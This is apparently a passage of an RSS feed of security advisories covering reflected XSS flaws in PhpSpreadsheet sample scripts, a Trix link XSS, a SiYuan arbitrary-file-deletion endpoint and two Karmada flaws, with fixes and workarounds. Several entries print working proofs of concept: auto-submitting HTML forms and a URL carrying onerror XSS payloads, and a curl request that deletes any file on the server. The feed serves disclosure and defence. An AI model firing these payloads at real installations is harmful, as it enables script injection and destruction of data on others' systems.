The researcher discovered zero-day vulnerability Unauthorized Reflected Cross-Site Scripting (XSS) (in `Currency.php` file) in Phpspreadsheet.

There is no sanitization in the `&#x2F;vendor&#x2F;phpoffice&#x2F;phpspreadsheet&#x2F;samples&#x2F;Wizards&#x2F;NumberFormat&#x2F;Currency.php` file, which leads to the possibility of a XSS attack.
Strings are formed using the `currency` parameter without sanitization, controlled by an attacker.

![fig9](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;dfac3fbf-de42-42af-8163-b76f0c54da6c)

*Figure 9.  A fragment of the query in which a string and a parameter are formed without sanitization*

An attacker can prepare a special HTML form that will be automatically sent to the vulnerable scenario.

*Listing 5. HTML form that demonstrates the exploitation of the XSS vulnerability*

```
&amp;lt;html&amp;gt;
  &amp;lt;!-- CSRF PoC - generated by Burp Suite Professional --&amp;gt;
  &amp;lt;body&amp;gt;
    &amp;lt;form action=&quot;https:&#x2F;&#x2F;192.***.***.***&#x2F;vendor&#x2F;phpoffice&#x2F;phpspreadsheet&#x2F;samples&#x2F;Wizards&#x2F;NumberFormat&#x2F;Currency.php&quot; method=&quot;POST&quot;&amp;gt;
      &amp;lt;input type=&quot;hidden&quot; name=&quot;number&quot; value=&quot;1234&amp;#46;5678&quot; &#x2F;&amp;gt;
      &amp;lt;input type=&quot;hidden&quot; name=&quot;currency&quot; value=&quot;&amp;#36;&amp;apos;&amp;quot;&amp;lt;img&amp;#32;src&amp;#61;1&amp;#32;onerror&amp;#61;alert&amp;#40;&amp;#41;&amp;gt;&quot; &#x2F;&amp;gt;
      &amp;lt;input type=&quot;hidden&quot; name=&quot;decimals&quot; value=&quot;2&quot; &#x2F;&amp;gt;
      &amp;lt;input type=&quot;hidden&quot; name=&quot;position&quot; value=&quot;1&quot; &#x2F;&amp;gt;
      &amp;lt;input type=&quot;hidden&quot; name=&quot;spacing&quot; value=&quot;0&quot; &#x2F;&amp;gt;
      &amp;lt;input type=&quot;hidden&quot; name=&quot;submit&quot; value=&quot;Display&amp;#32;Mask&quot; &#x2F;&amp;gt;
      &amp;lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; &#x2F;&amp;gt;
    &amp;lt;&#x2F;form&amp;gt;
    &amp;lt;script&amp;gt;
      history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;&#x2F;&#x27;);
      document.forms[0].submit();
    &amp;lt;&#x2F;script&amp;gt;
  &amp;lt;&#x2F;body&amp;gt;
&amp;lt;&#x2F;html&amp;gt;
```

After sending the script provided in Listing 5, the XSS vulnerability is exploited. Figure 10 shows the execution of arbitrary JavaScript code during the submission of a POST form. 

&amp;lt;img width=&quot;428&quot; alt=&quot;fig10&quot; src=&quot;https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;2be8c94b-03ac-40d9-aa7a-9d326eb79335&quot; &#x2F;&amp;gt;

*Figure 10. Executing arbitrary JavaScript code*

# Credit
This vulnerability was discovered by **Aleksey Solovev (Positive Technologies)**
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-c6fv-7vh8-2rhr: 7.1 | <b>PhpSpreadsheet allows unauthorized Reflected XSS in the Accounting.php file</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-c6fv-7vh8-2rhr</link>
                    <pubDate>2025-01-03T17:06:23Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-c6fv-7vh8-2rhr'>https://osv.dev/vulnerability/GHSA-c6fv-7vh8-2rhr</a><br>
                            <b>Published:</b> 2025-01-03T17:06:23Z<br>
                            <b>Severity:</b> 7.1<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-c6fv-7vh8-2rhr'>https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-c6fv-7vh8-2rhr</a></li><li>- <a target='_blank' href='https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4'>https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4</a></li><li>- <a target='_blank' href='https://github.com/PHPOffice/PhpSpreadsheet'>https://github.com/PHPOffice/PhpSpreadsheet</a></li></ul><br>
                            <b>Details:</b> <b>PhpSpreadsheet allows unauthorized Reflected XSS in the Accounting.php file</b><br># Unauthorized Reflected XSS in the `Accounting.php` file

**Product**: Phpspreadsheet
**Version**: version 3.6.0
**CWE-ID**: CWE-79: Improper Neutralization of Input During Web Page Generation (&#x27;Cross-site Scripting&#x27;)
**CVSS vector v.3.1**: 8.2 (AV:N&#x2F;AC:L&#x2F;PR:N&#x2F;UI:R&#x2F;S:U&#x2F;C:L&#x2F;I:H&#x2F;A:N)
**CVSS vector v.4.0**: 8.3 (AV:N&#x2F;AC:L&#x2F;AT:N&#x2F;PR:N&#x2F;UI:A&#x2F;VC:N&#x2F;VI:H&#x2F;VA:N&#x2F;SC:L&#x2F;SI:H&#x2F;SA:L)
**Description**: using the `&#x2F;vendor&#x2F;phpoffice&#x2F;phpspreadsheet&#x2F;samples&#x2F;Wizards&#x2F;NumberFormat&#x2F;Accounting.php` script, an attacker can perform a XSS-type attack
**Impact**: executing arbitrary JavaScript code in the browser
**Vulnerable component**: the `&#x2F;vendor&#x2F;phpoffice&#x2F;phpspreadsheet&#x2F;samples&#x2F;Wizards&#x2F;NumberFormat&#x2F;Accounting.php` file
**Exploitation conditions**: an unauthorized user
**Mitigation**: sanitization of the currency variable
**Researcher**: Aleksey Solovev (Positive Technologies)

# Research

The researcher discovered zero-day vulnerability Unauthorized Reflected Cross-Site Scripting (XSS) (in `Accounting.php` file) in Phpspreadsheet.

There is no sanitization in the `&#x2F;vendor&#x2F;phpoffice&#x2F;phpspreadsheet&#x2F;samples&#x2F;Wizards&#x2F;NumberFormat&#x2F;Accounting.php` file, which leads to the possibility of a XSS attack.
Strings are formed using the currency parameter without sanitization, which is controlled by the attacker.

![fig7](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;da0ee52d-2306-4770-a61d-bce4ba553f4f)

*Figure 7. A fragment of the query in which a string and a parameter are formed without sanitization*

An attacker can prepare a special HTML form that will be automatically sent to the vulnerable scenario.

*Listing 4. HTML form that demonstrates the exploitation of the XSS vulnerability*

```
&amp;lt;html&amp;gt;
  &amp;lt;!-- CSRF PoC - generated by Burp Suite Professional --&amp;gt;
  &amp;lt;body&amp;gt;
    &amp;lt;form action=&quot;https:&#x2F;&#x2F;192.***.***.***&#x2F;vendor&#x2F;phpoffice&#x2F;phpspreadsheet&#x2F;samples&#x2F;Wizards&#x2F;NumberFormat&#x2F;Accounting.php&quot; method=&quot;POST&quot;&amp;gt;
      &amp;lt;input type=&quot;hidden&quot; name=&quot;number&quot; value=&quot;1234&amp;#46;5678&quot; &#x2F;&amp;gt;
      &amp;lt;input type=&quot;hidden&quot; name=&quot;currency&quot; value=&quot;&amp;#36;&amp;lt;img&amp;#32;src&amp;#61;1&amp;#32;onerror&amp;#61;alert&amp;#40;&amp;#41;&amp;gt;&quot; &#x2F;&amp;gt;
      &amp;lt;input type=&quot;hidden&quot; name=&quot;decimals&quot; value=&quot;2&quot; &#x2F;&amp;gt;
      &amp;lt;input type=&quot;hidden&quot; name=&quot;position&quot; value=&quot;1&quot; &#x2F;&amp;gt;
      &amp;lt;input type=&quot;hidden&quot; name=&quot;spacing&quot; value=&quot;0&quot; &#x2F;&amp;gt;
      &amp;lt;input type=&quot;hidden&quot; name=&quot;submit&quot; value=&quot;Display&amp;#32;Mask&quot; &#x2F;&amp;gt;
      &amp;lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; &#x2F;&amp;gt;
    &amp;lt;&#x2F;form&amp;gt;
    &amp;lt;script&amp;gt;
      history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;&#x2F;&#x27;);
      document.forms[0].submit();
    &amp;lt;&#x2F;script&amp;gt;
  &amp;lt;&#x2F;body&amp;gt;
&amp;lt;&#x2F;html&amp;gt;
```

After sending the script provided in Listing 4, the XSS vulnerability is exploited. Figure 8 shows the execution of arbitrary JavaScript code during the submission of a POST form.

&amp;lt;img width=&quot;460&quot; alt=&quot;fig8&quot; src=&quot;https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;b009256e-61f7-4d72-8f6a-cc6e0efe2bb1&quot; &#x2F;&amp;gt;

*Figure 8. Executing arbitrary JavaScript code*

# Credit
This vulnerability was discovered by **Aleksey Solovev (Positive Technologies)**
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-jmpx-686v-c3wx: 7.1 | <b>PhpSpreadsheet allows unauthorized Reflected XSS in the constructor of the Downloader class</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-jmpx-686v-c3wx</link>
                    <pubDate>2025-01-03T17:06:05Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-jmpx-686v-c3wx'>https://osv.dev/vulnerability/GHSA-jmpx-686v-c3wx</a><br>
                            <b>Published:</b> 2025-01-03T17:06:05Z<br>
                            <b>Severity:</b> 7.1<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-jmpx-686v-c3wx'>https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-jmpx-686v-c3wx</a></li><li>- <a target='_blank' href='https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4#diff-fbb0f53a5c68eeeffaa9ab35552c0b01740396f1a4045af5d2935ec2a62a7816'>https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4#diff-fbb0f53a5c68eeeffaa9ab35552c0b01740396f1a4045af5d2935ec2a62a7816</a></li><li>- <a target='_blank' href='https://github.com/PHPOffice/PhpSpreadsheet'>https://github.com/PHPOffice/PhpSpreadsheet</a></li></ul><br>
                            <b>Details:</b> <b>PhpSpreadsheet allows unauthorized Reflected XSS in the constructor of the Downloader class</b><br># Unauthorized Reflected XSS in the constructor of the `Downloader` class

**Product**: Phpspreadsheet
**Version**: version 3.6.0
**CWE-ID**: CWE-79: Improper Neutralization of Input During Web Page Generation (&#x27;Cross-site Scripting&#x27;)
**CVSS vector v.3.1**: 8.2 (AV:N&#x2F;AC:L&#x2F;PR:N&#x2F;UI:R&#x2F;S:U&#x2F;C:L&#x2F;I:H&#x2F;A:N)
**CVSS vector v.4.0**: 8.3 (AV:N&#x2F;AC:L&#x2F;AT:N&#x2F;PR:N&#x2F;UI:A&#x2F;VC:N&#x2F;VI:H&#x2F;VA:N&#x2F;SC:L&#x2F;SI:H&#x2F;SA:L)
**Description**: using the `&#x2F;vendor&#x2F;phpoffice&#x2F;phpspreadsheet&#x2F;samples&#x2F;download.php` script, an attacker can perform a XSS-type attack
**Impact**: execution of arbitrary JavaScript code in the browser
**Vulnerable component**: the constructor of the `Downloader` class
**Exploitation conditions**: an unauthorized user
**Mitigation**: sanitization of the `name` and `type` variables
**Researcher**: Aleksey Solovev (Positive Technologies)

# Research

The researcher discovered zero-day vulnerability Unauthorized Reflected Cross-Site Scripting (XSS) (in the constructor of the `Downloader` class) in Phpspreadsheet.

The latest version (3.6.0) of the `phpoffice&#x2F;phpspreadsheet` library was installed. The installation was carried out with the inclusion of examples.

*Listing 1. Installing the `phpoffice&#x2F;phpspreadsheet` library*
```
$ composer require phpoffice&#x2F;phpspreadsheet --prefer-source
```

The `.&#x2F;vendor&#x2F;phpoffice&#x2F;phpspreadsheet&#x2F;samples&#x2F;download.php` file processes the GET parameters `name` and `type`.

![fig1](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;78d5b3c7-e2ab-4487-98e2-a975f74a71c0)

*Figure 1. The `.&#x2F;vendor&#x2F;phpoffice&#x2F;phpspreadsheet&#x2F;samples&#x2F;download.php` file accepts GET parameters.*

Consider the constructor of the `Downloader` class, where GET parameters are passed. Error is displayed without sanitization using GET parameters transmitted from the user.

![fig2](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;00baf1f8-298c-4654-a3e4-b99cf8053eac)

*Figure 2. Error is displayed without sanitization*

When clicking on the following link, arbitrary JavaScript code will be executed.

*Listing 2.*
```
https:&#x2F;&#x2F;192.***.***.***&#x2F;vendor&#x2F;phpoffice&#x2F;phpspreadsheet&#x2F;samples&#x2F;download.php?name=%3Cimg%20src=1%20onerror=alert()%3E&amp;type=1
```

Demonstration of the execution of arbitrary JavaScript code.

&amp;lt;img width=&quot;537&quot; alt=&quot;fig3&quot; src=&quot;https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;745d6e21-396f-4357-8ff8-e856adf15fee&quot; &#x2F;&amp;gt;

*Figure 3. Executing arbitrary JavaScript code*


# Credit
This vulnerability was discovered by **Aleksey Solovev (Positive Technologies)**
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-j386-3444-qgwg: 5.3 | <b>Trix allows Cross-site Scripting via `javascript:` url in a link</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-j386-3444-qgwg</link>
                    <pubDate>2025-01-03T16:29:58Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-j386-3444-qgwg'>https://osv.dev/vulnerability/GHSA-j386-3444-qgwg</a><br>
                            <b>Published:</b> 2025-01-03T16:29:58Z<br>
                            <b>Severity:</b> 5.3<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/basecamp/trix/security/advisories/GHSA-j386-3444-qgwg'>https://github.com/basecamp/trix/security/advisories/GHSA-j386-3444-qgwg</a></li><li>- <a target='_blank' href='https://github.com/basecamp/trix/commit/180c8d337f18e1569cea6ef29b4d03ffff5b5faa'>https://github.com/basecamp/trix/commit/180c8d337f18e1569cea6ef29b4d03ffff5b5faa</a></li><li>- <a target='_blank' href='https://github.com/basecamp/trix/commit/c4f0d6f80654603932af6685694f694e96593b93'>https://github.com/basecamp/trix/commit/c4f0d6f80654603932af6685694f694e96593b93</a></li><li>- <a target='_blank' href='https://gist.github.com/th4s1s/3921fd9c3e324ad9a3e0d846166e3eb8'>https://gist.github.com/th4s1s/3921fd9c3e324ad9a3e0d846166e3eb8</a></li><li>- <a target='_blank' href='https://github.com/basecamp/trix'>https://github.com/basecamp/trix</a></li></ul><br>
                            <b>Details:</b> <b>Trix allows Cross-site Scripting via `javascript:` url in a link</b><br>The Trix editor, versions prior to 2.1.11, is vulnerable to XSS when pasting malicious code in the link field.

### Impact

An attacker could trick the user to copy&amp;paste a malicious `javascript:` URL as a link that would execute arbitrary JavaScript code within the context of the user&#x27;s session, potentially leading to unauthorized actions being performed or sensitive information being disclosed.

See https:&#x2F;&#x2F;gist.github.com&#x2F;th4s1s&#x2F;3921fd9c3e324ad9a3e0d846166e3eb8

### Patches

Update Recommendation: Users should upgrade to Trix editor version 2.1.12 or later.

### Workarounds

This is not really a workaround but something that should be considered in addition to upgrading to the patched version. If affected users can disallow browsers that don&#x27;t support a Content Security Policy, then this would be an effective workaround for this and all XSS vulnerabilities. Set CSP policies such as script-src &#x27;self&#x27; to ensure that only scripts hosted on the same origin are executed, and explicitly prohibit inline scripts using script-src-elem.

### References

https:&#x2F;&#x2F;gist.github.com&#x2F;th4s1s&#x2F;3921fd9c3e324ad9a3e0d846166e3eb8

### Credits

This vulnerability was reported by Hackerone researcher https:&#x2F;&#x2F;hackerone.com&#x2F;lio346?type=user
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-8fx8-pffw-w498: 8.7 | <b>SiYuan has an arbitrary file deletion vulnerability</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-8fx8-pffw-w498</link>
                    <pubDate>2025-01-03T16:24:34Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-8fx8-pffw-w498'>https://osv.dev/vulnerability/GHSA-8fx8-pffw-w498</a><br>
                            <b>Published:</b> 2025-01-03T16:24:34Z<br>
                            <b>Severity:</b> 8.7<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/siyuan-note/siyuan/security/advisories/GHSA-8fx8-pffw-w498'>https://github.com/siyuan-note/siyuan/security/advisories/GHSA-8fx8-pffw-w498</a></li><li>- <a target='_blank' href='https://github.com/siyuan-note/siyuan/commit/d9887aeec1b27073bec66299a9a4181dc42969f3'>https://github.com/siyuan-note/siyuan/commit/d9887aeec1b27073bec66299a9a4181dc42969f3</a></li><li>- <a target='_blank' href='https://github.com/siyuan-note/siyuan'>https://github.com/siyuan-note/siyuan</a></li></ul><br>
                            <b>Details:</b> <b>SiYuan has an arbitrary file deletion vulnerability</b><br>### Summary
A **arbitrary file deletion vulnerability** has been identified in the latest version of Siyuan Note. The vulnerability exists in the `POST &#x2F;api&#x2F;history&#x2F;getDocHistoryContent` endpoint.An attacker can craft a payload to exploit this vulnerability, resulting in the deletion of arbitrary files on the server.

### Details
The vulnerability can be reproduced by sending a crafted request to the `&#x2F;api&#x2F;history&#x2F;getDocHistoryContent` endpoint.

Sending a request  to the `&#x2F;api&#x2F;history&#x2F;getDocHistoryContent` like:

```
curl &quot;http:&#x2F;&#x2F;127.0.0.1:6806&#x2F;api&#x2F;history&#x2F;getDocHistoryContent&quot; -X POST -H &quot;Content-Type: application&#x2F;json&quot; -d &#x27;{&quot;historyPath&quot;:&quot;&amp;lt;abs_filepath_of_a_file&amp;gt;&quot;}&#x27;
```

Replace `&amp;lt;abs_filepath_of_a_file&amp;gt;` with the absolute file path of the target file you wish to delete.



The `historyPath` parameter in the payload is processed by the `func getDocHistoryContent` in `api&#x2F;history.go:133`.

In turn, `historyPath` is passed to the `func GetDocHistoryContent`  located in `model&#x2F;history.go:150` , which is the slink of the vulnerability.

if `historyPath` exists and does not satisfy the `filesys.ParseJSONWithoutFix`, then it will be deleted by `os.RemoveAll`

```go
func GetDocHistoryContent(historyPath, keyword string, highlight bool) (id, rootID, content string, isLargeDoc bool, err error) {
	if !gulu.File.IsExist(historyPath) {
		logging.LogWarnf(&quot;doc history [%s] not exist&quot;, historyPath)
		return
	}

	data, err := filelock.ReadFile(historyPath)
	if err != nil {
		logging.LogErrorf(&quot;read file [%s] failed: %s&quot;, historyPath, err)
		return
	}
	isLargeDoc = 1024*1024*1 &amp;lt;= len(data)

	luteEngine := NewLute()
	historyTree, err := filesys.ParseJSONWithoutFix(data, luteEngine.ParseOptions)
	if err != nil {
		logging.LogErrorf(&quot;parse tree from file [%s] failed, remove it&quot;, historyPath)
		os.RemoveAll(historyPath)
		return
	}
	...
}
```



### PoC
```
curl &quot;http:&#x2F;&#x2F;127.0.0.1:6806&#x2F;api&#x2F;history&#x2F;getDocHistoryContent&quot; -X POST -H &quot;Content-Type: application&#x2F;json&quot; -d &#x27;{&quot;historyPath&quot;:&quot;&amp;lt;abs_filepath_of_a_file&amp;gt;&quot;}&#x27;
```

### Impact
arbitrary file deletion vulnerability

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-cwrh-575j-8vr3: 5.3 | <b>Karmada Tar Slips in CRDs archive extraction</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-cwrh-575j-8vr3</link>
                    <pubDate>2025-01-03T16:15:54Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-cwrh-575j-8vr3'>https://osv.dev/vulnerability/GHSA-cwrh-575j-8vr3</a><br>
                            <b>Published:</b> 2025-01-03T16:15:54Z<br>
                            <b>Severity:</b> 5.3<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/karmada-io/karmada/security/advisories/GHSA-cwrh-575j-8vr3'>https://github.com/karmada-io/karmada/security/advisories/GHSA-cwrh-575j-8vr3</a></li><li>- <a target='_blank' href='https://github.com/karmada-io/karmada/pull/5703'>https://github.com/karmada-io/karmada/pull/5703</a></li><li>- <a target='_blank' href='https://github.com/karmada-io/karmada/pull/5713'>https://github.com/karmada-io/karmada/pull/5713</a></li><li>- <a target='_blank' href='https://github.com/karmada-io/karmada/commit/40ec488b18a461ab0f871d2c9ec8665b361f0d50'>https://github.com/karmada-io/karmada/commit/40ec488b18a461ab0f871d2c9ec8665b361f0d50</a></li><li>- <a target='_blank' href='https://github.com/karmada-io/karmada/commit/f78e7e2a3d02bed04e9bc7abd3ae7b3ac56862d2'>https://github.com/karmada-io/karmada/commit/f78e7e2a3d02bed04e9bc7abd3ae7b3ac56862d2</a></li><li>- <a target='_blank' href='https://github.com/karmada-io/karmada'>https://github.com/karmada-io/karmada</a></li></ul><br>
                            <b>Details:</b> <b>Karmada Tar Slips in CRDs archive extraction</b><br>### Impact
_What kind of vulnerability is it? Who is impacted?_

Both in karmadactl and karmada-operator, it is possible to supply a filesystem path, or an HTTP(s) URL to retrieve the custom resource definitions(CRDs) needed by karmada. The CRDs are downloaded as a gzipped tarfile and are vulnerable to a TarSlip vulnerability. An attacker able to supply a malicious CRD file into a karmada initialization could write arbitrary files in arbitrary paths of the filesystem.

### Patches
_Has the problem been patched? What versions should users upgrade to?_

From karmada version v1.12.0, when processing custom CRDs files, CRDs archive verification is utilized to enhance file system robustness.

### Workarounds
_Is there a way for users to fix or remediate the vulnerability without upgrading?_

When using `karmadactl init` to set up Karmada, if you need to set flag `--crd` to customize the CRD files required for karmada initialization, you can manually inspect the CRD files to check whether they contain sequences such as `..&#x2F;` that would alter file paths, to determine if they potentially include malicious files. 

When using karmada-operator to set up Karmada, you must upgrade your karmada-operator to one of the fixed versions.

### References
_Are there any links users can visit to find out more?_

1. Enhancements made from the Karmada community: https:&#x2F;&#x2F;github.com&#x2F;karmada-io&#x2F;karmada&#x2F;pull&#x2F;5713, https:&#x2F;&#x2F;github.com&#x2F;karmada-io&#x2F;karmada&#x2F;pull&#x2F;5703

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-mg7w-c9x2-xh7r: 8.7 | <b>Karmada PULL Mode Cluster Privilege Escalation</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-mg7w-c9x2-xh7r</link>
                    <pubDate>2025-01-03T16:12:03Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-mg7w-c9x2-xh7r'>https://osv.dev/vulnerability/GHSA-mg7w-c9x2-xh7r</a><br>
                            <b>Published:</b> 2025-01-03T16:12:03Z<br>
                            <b>Severity:</b> 8.7<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/karmada-io/karmada/security/advisories/GHSA-mg7w-c9x2-xh7r'>https://github.com/karmada-io/karmada/security/advisories/GHSA-mg7w-c9x2-xh7r</a></li><li>- <a target='_blank' href='https://github.com/karmada-io/karmada/pull/5793'>https://github.com/karmada-io/karmada/pull/5793</a></li><li>- <a target='_blank' href='https://github.com/karmada-io/karmada/commit/2c82055c4c7f469411b1ba48c4dba4841df04831'>https://github.com/karmada-io/karmada/commit/2c82055c4c7f469411b1ba48c4dba4841df04831</a></li><li>- <a target='_blank' href='https://github.com/karmada-io/karmada'>https://github.com/karmada-io/karmada</a></li><li>- <a target='_blank' href='https://karmada.io/docs/administrator/security/component-permission'>https://karmada.io/docs/administrator/security/component-permission</a></li></ul><br>
                            <b>Details:</b> <b>Karmada PULL Mode Cluster Privilege Escalation</b><br>### Impact
_What kind of vulnerability is it? Who is impacted?_

The [PULL](https:&#x2F;&#x2F;karmada.io&#x2F;docs&#x2F;next&#x2F;userguide&#x2F;clustermanager&#x2F;cluster-registration#pull-mode) mode clusters registered with the `karmadactl register` command have excessive privileges to access control plane resources. By abusing these permissions, an attacker able to authenticate as the karmada-agent to a karmada cluster would be able to obtain administrative privileges over the entire federation system including all registered member clusters.


### Patches
_Has the problem been patched? What versions should users upgrade to?_

Since Karmada v1.12.0, command `karmadactl register` restricts the access permissions of pull mode member clusters to control plane resources. This way, an attacker able to authenticate as the karmada-agent cannot control other member clusters in Karmada.

### Workarounds
_Is there a way for users to fix or remediate the vulnerability without upgrading?_

Restricts the access permissions of pull mode member clusters to control plane resources according to [Karmada Component Permissions Docs](https:&#x2F;&#x2F;karmada.io&#x2F;docs&#x2F;administrator&#x2F;security&#x2F;component-permission).
### References
_Are there any links users can visit to find out more?_
 1. Enhancements made from the Karmada community: https:&#x2F;&#x2F;github.com&#x2F;karmada-io&#x2F;karmada&#x2F;pull&#x2F;5793
 2. Karmada Component Permissions: https:&#x2F;&#x2F;karmada.io&#x2F;docs&#x2F;administrator&#x2F;security&#x2F;component-permission

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-x88g-h956-m5xg: 7.1 | <b>PhpSpreadsheet allows unauthorized Reflected XSS in `Convert-Online.php` file</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-x88g-h956-m5xg</link>
                    <pubDate>2025-01-03T16:05:26Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-x88g-h956-m5xg'>https://osv.dev/vulnerability/GHSA-x88g-h956-m5xg</a><br>
                            <b>Published:</b> 2025-01-03T16:05:26Z<br>
                            <b>Severity:</b> 7.1<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-x88g-h956-m5xg'>https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-x88g-h956-m5xg</a></li><li>- <a target='_blank' href='https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4'>https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4</a></li><li>- <a target='_blank' href='https://github.com/PHPOffice/PhpSpreadsheet'>https://github.com/PHPOffice/PhpSpreadsheet</a></li></ul><br>
                            <b>Details:</b> <b>PhpSpreadsheet allows unauthorized Reflected XSS in `Convert-Online.php` file</b><br># Unauthorized Reflected XSS in `Convert-Online.php` file
**Product**: Phpspreadsheet
**Version**: version 3.6.0
**CWE-ID**: CWE-79: Improper Neutralization of Input During Web Page Generation (&#x27;Cross-site Scripting&#x27;)
**CVSS vector v.3.1**: 8.2 (AV:N&#x2F;AC:L&#x2F;PR:N&#x2F;UI:R&#x2F;S:U&#x2F;C:L&#x2F;I:H&#x2F;A:N)
**CVSS vector v.4.0**: 8.3 (AV:N&#x2F;AC:L&#x2F;AT:N&#x2F;PR:N&#x2F;UI:A&#x2F;VC:N&#x2F;VI:H&#x2F;VA:N&#x2F;SC:L&#x2F;SI:H&#x2F;SA:L)
**Description**: using the `&#x2F;vendor&#x2F;phpoffice&#x2F;phpspreadsheet&#x2F;samples&#x2F;Engineering&#x2F;Convert-Online.php` script, an attacker can perform a XSS-type attack 
**Impact**: executing arbitrary JavaScript code in the browser
**Vulnerable component**: the `&#x2F;vendor&#x2F;phpoffice&#x2F;phpspreadsheet&#x2F;samples&#x2F;Engineering&#x2F;Convert-Online.php` file
**Exploitation conditions**: an unauthorized user
**Mitigation**: sanitization of the quantity variable
**Researcher**: Aleksey Solovev (Positive Technologies)

# Research

The researcher discovered zero-day vulnerability Unauthorized Reflected Cross-Site Scripting (XSS) (in `Convert-Online.php` file) in Phpspreadsheet.

There is no sanitization in the `&#x2F;vendor&#x2F;phpoffice&#x2F;phpspreadsheet&#x2F;samples&#x2F;Engineering&#x2F;Convert-Online.php` file, which leads to the possibility of a XSS attack.

![fig4](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;71a6ab8b-db65-4e7e-bb36-39f0bd0f7077)

*Figure 4. The message with the quantity parameter is displayed without sanitization*


The following figure shows a POST HTTP-request and a response to the server with the variable quantity, which is displayed in the response from the server without sanitization.

&amp;lt;img width=&quot;460&quot; alt=&quot;fig5&quot; src=&quot;https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;022323c9-ca1e-44ea-9380-37ed7848e971&quot; &#x2F;&amp;gt;

*Figure 5. In the server&#x27;s response , the quantity variable is displayed without sanitization*

An attacker can prepare a special HTML form that will be automatically sent to the vulnerable scenario.

*Listing 3. HTML form that demonstrates the exploitation of the XSS vulnerability*

```
&amp;lt;html&amp;gt;
  &amp;lt;!-- CSRF PoC - generated by Burp Suite Professional --&amp;gt;
  &amp;lt;body&amp;gt;
    &amp;lt;form action=&quot;https:&#x2F;&#x2F;192.***.***.***&#x2F;vendor&#x2F;phpoffice&#x2F;phpspreadsheet&#x2F;samples&#x2F;Engineering&#x2F;Convert-Online.php&quot; method=&quot;POST&quot;&amp;gt;
      &amp;lt;input type=&quot;hidden&quot; name=&quot;category&quot; value=&quot;Weight&amp;#32;and&amp;#32;Mass&quot; &#x2F;&amp;gt;
      &amp;lt;input type=&quot;hidden&quot; name=&quot;quantity&quot; value=&quot;1&amp;#46;0&amp;lt;img&amp;#32;src&amp;#61;1&amp;#32;onerror&amp;#61;alert&amp;#40;&amp;#41;&amp;gt;&quot; &#x2F;&amp;gt;
      &amp;lt;input type=&quot;hidden&quot; name=&quot;fromUnit&quot; value=&quot;g&quot; &#x2F;&amp;gt;
      &amp;lt;input type=&quot;hidden&quot; name=&quot;toUnit&quot; value=&quot;g&quot; &#x2F;&amp;gt;
      &amp;lt;input type=&quot;hidden&quot; name=&quot;submitx&quot; value=&quot;Convert&quot; &#x2F;&amp;gt;
